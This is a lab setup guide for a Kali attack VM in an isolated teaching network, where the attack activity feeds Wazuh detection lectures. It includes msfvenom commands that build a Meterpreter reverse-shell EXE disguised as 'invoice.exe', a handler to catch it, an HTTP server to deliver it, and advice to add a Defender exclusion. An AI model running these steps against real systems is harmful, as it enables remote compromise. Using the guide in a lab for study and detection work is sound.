# 04 — Kali Attacker Setup

**Where:** the `kali` VM (`10.10.10.100`). You said this is already configured — this doc makes sure it has everything the attack docs need and is wired into the isolated network.

**Goal:** a ready attack platform that can reach the victims, run reconnaissance/exploitation/post-exploitation, and (later) host a C2 and the Caldera server.

---

## Step 1 — Network placement

- Kali's Adapter 1 → host-only `vboxnet0`, static IP `10.10.10.100`.
- Confirm reachability:

```bash
ping -c2 10.10.10.20    # Windows victim
ping -c2 10.10.10.10    # Wazuh manager
ping -c2 10.10.10.30    # Linux victim (if built)
```

> Keep NAT **off** during attacks. Turn it on only to install/update tools in Step 2.

---

## Step 2 — Tools inventory

Most ship with Kali. Update and fill gaps (NAT on for this step):

```bash
sudo apt update && sudo apt -y upgrade

# Core offensive tooling (usually preinstalled on Kali)
sudo apt -y install nmap metasploit-framework hydra crackmapexec \
  smbclient enum4linux responder seclists python3-impacket

# Handy extras
sudo apt -y install git curl net-tools
```

Initialize the Metasploit database:

```bash
sudo msfdb init
msfconsole -q -x "db_status; exit"
```

### Tool map (what each is for, by ATT&CK tactic)

| Tool | Used for | ATT&CK tactic |
|------|----------|---------------|
| `nmap` | host/port/service discovery | Reconnaissance / Discovery |
| `enum4linux`, `smbclient`, `crackmapexec` | SMB enumeration | Discovery |
| `hydra`, `crackmapexec` | password brute force | Credential Access |
| `metasploit` | exploitation, payloads, Meterpreter C2 | Initial Access / Execution / C2 |
| `impacket` (`psexec.py`, `wmiexec.py`, `secretsdump.py`) | lateral movement, cred dumping | Lateral Movement / Credential Access |
| `responder` | LLMNR/NBT-NS poisoning | Credential Access |
| MITRE Caldera (Step 4) | automated multi-stage adversary emulation | All (APT chain) |

---

## Step 3 — Generate a reusable payload (for later docs)

You'll use this in Docs 09 and 10. Create a Meterpreter reverse-shell EXE that connects back to Kali:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.10.100 LPORT=4444 -f exe -o /tmp/invoice.exe
```

Handler to catch it:

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_tcp; \
  set LHOST 10.10.10.100; set LPORT 4444; exploit -j"
```

> Windows Defender will likely flag this — that's realistic and fine. For the demo you can either (a) let it get blocked and show the detection, or (b) add a Defender exclusion on the victim to guarantee execution for teaching. Both are valid teaching moments.

---

## Step 4 — Install MITRE Caldera (adversary emulation server)

Caldera automates realistic, multi-step adversary behavior — perfect for the APT case study (Doc 10) without writing every command by hand. Run it on Kali (NAT on to build):

```bash
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip3 install -r requirements.txt   # or use the documented docker method
python3 server.py --insecure
```

Access the Caldera UI at `http://10.10.10.100:8888` (default creds are in `conf/local.yml` / printed at start). You will deploy a Caldera **agent (Sandcat)** onto the Windows victim in Doc 10.

> If pip dependencies are painful, the Docker method from the Caldera repo is the reliable fallback.

---

## Step 5 — Serve payloads to victims

A quick HTTP server so victims can "download" your files (simulating a malicious download / drive-by):

```bash
cd /tmp
python3 -m http.server 8080
# On the victim: http://10.10.10.100:8080/invoice.exe
```

---

## Verify

- [ ] Kali reaches all victims by ping; victims can reach Kali.
- [ ] `msfconsole` opens and `db_status` shows connected.
- [ ] `msfvenom` produced `/tmp/invoice.exe`.
- [ ] Caldera UI loads at `http://10.10.10.100:8888`.
- [ ] Snapshot Kali as `attacker-ready`.

---

> [!NOTE]
> **Recording checkpoint:** No standalone lecture here. This is the attack platform that powers **9.2, 9.4, 9.5, and 9.6**. Before recording those, you record from the **defender's seat** (Wazuh), using Kali only to generate the activity.

Next: [05 — MITRE ATT&CK Deep Dive](05-mitre-attack-framework.md)
